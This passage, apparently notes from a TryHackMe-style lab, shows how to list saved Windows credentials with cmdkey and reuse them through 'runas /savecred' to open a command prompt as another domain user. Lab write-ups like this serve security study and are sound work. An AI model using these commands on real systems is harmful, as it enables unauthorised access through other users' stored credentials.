@@ -1,0 +1,33 @@
+this is an alternative to the other method, just as decent tho
+
+The RunAs tool has various command arguments that could be used in the Windows system. The /savecred argument allows you to save the credentials of the user in Windows Credentials Manager
+
+Another way to enumerate stored credentials is by using cmdkey, which is a tool to create, delete, and display stored Windows credentials.
+By providing the /list argument, we can show all stored credentials, or we can specify the credential to display more details /list:computername.
+
+cmdkey /list
+
+the output can show if you have some sort of stored username going on.
+with this, then you need to run as this user within this domain.
+
+for example, let me put this:
+
+output from cmdkey /list:
+
+C:\Users\thm>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=thm.red\thm-local
+    Type: Domain Password
+    User: thm.red\thm-local
+
+then, we can see that we have a password stored as thm-local. from this
+we will now use the runas command to our advantage to do this:
+
+runas /savecred /user:THM.red\thm-local cmd.exe
+Attempting to start cmd.exe as user "THM.red\thm-local"
+
+now, we could have a terminal under the thm-local account!
+
+
